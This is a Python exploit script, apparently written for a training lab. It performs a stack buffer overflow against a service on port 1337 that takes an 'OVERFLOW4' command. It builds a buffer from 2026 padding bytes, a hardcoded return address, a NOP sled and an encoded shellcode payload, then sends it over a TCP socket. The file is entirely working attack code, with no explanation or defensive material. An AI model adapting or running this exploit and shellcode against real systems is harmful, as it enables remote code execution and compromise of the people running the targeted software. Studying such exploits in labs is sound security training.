#!/usr/bin/env python3
import socket

ip = "10.10.175.52"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xda\xdd\xb8\x29\x44\x3b\x1a\xd9\x74\x24\xf4\x5b\x33\xc9"
"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x6a\x57\xd9\xef\x90"
"\xbf\x9f\x10\x68\x40\xc0\x99\x8d\x71\xc0\xfe\xc6\x22\xf0"
"\x75\x8a\xce\x7b\xdb\x3e\x44\x09\xf4\x31\xed\xa4\x22\x7c"
"\xee\x95\x17\x1f\x6c\xe4\x4b\xff\x4d\x27\x9e\xfe\x8a\x5a"
"\x53\x52\x42\x10\xc6\x42\xe7\x6c\xdb\xe9\xbb\x61\x5b\x0e"
"\x0b\x83\x4a\x81\x07\xda\x4c\x20\xcb\x56\xc5\x3a\x08\x52"
"\x9f\xb1\xfa\x28\x1e\x13\x33\xd0\x8d\x5a\xfb\x23\xcf\x9b"
"\x3c\xdc\xba\xd5\x3e\x61\xbd\x22\x3c\xbd\x48\xb0\xe6\x36"
"\xea\x1c\x16\x9a\x6d\xd7\x14\x57\xf9\xbf\x38\x66\x2e\xb4"
"\x45\xe3\xd1\x1a\xcc\xb7\xf5\xbe\x94\x6c\x97\xe7\x70\xc2"
"\xa8\xf7\xda\xbb\x0c\x7c\xf6\xa8\x3c\xdf\x9f\x1d\x0d\xdf"
"\x5f\x0a\x06\xac\x6d\x95\xbc\x3a\xde\x5e\x1b\xbd\x21\x75"
"\xdb\x51\xdc\x76\x1c\x78\x1b\x22\x4c\x12\x8a\x4b\x07\xe2"
"\x33\x9e\x88\xb2\x9b\x71\x69\x62\x5c\x22\x01\x68\x53\x1d"
"\x31\x93\xb9\x36\xd8\x6e\x2a\x33\x1b\x67\xab\x2b\x21\x87"
"\xba\xf7\xac\x61\xd6\x17\xf9\x3a\x4f\x81\xa0\xb0\xee\x4e"
"\x7f\xbd\x31\xc4\x8c\x42\xff\x2d\xf8\x50\x68\xde\xb7\x0a"
"\x3f\xe1\x6d\x22\xa3\x70\xea\xb2\xaa\x68\xa5\xe5\xfb\x5f"
"\xbc\x63\x16\xf9\x16\x91\xeb\x9f\x51\x11\x30\x5c\x5f\x98"
"\xb5\xd8\x7b\x8a\x03\xe0\xc7\xfe\xdb\xb7\x91\xa8\x9d\x61"
"\x50\x02\x74\xdd\x3a\xc2\x01\x2d\xfd\x94\x0d\x78\x8b\x78"
"\xbf\xd5\xca\x87\x70\xb2\xda\xf0\x6c\x22\x24\x2b\x35\x42"
"\xc7\xf9\x40\xeb\x5e\x68\xe9\x76\x61\x47\x2e\x8f\xe2\x6d"
"\xcf\x74\xfa\x04\xca\x31\xbc\xf5\xa6\x2a\x29\xf9\x15\x4a"
"\x78")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
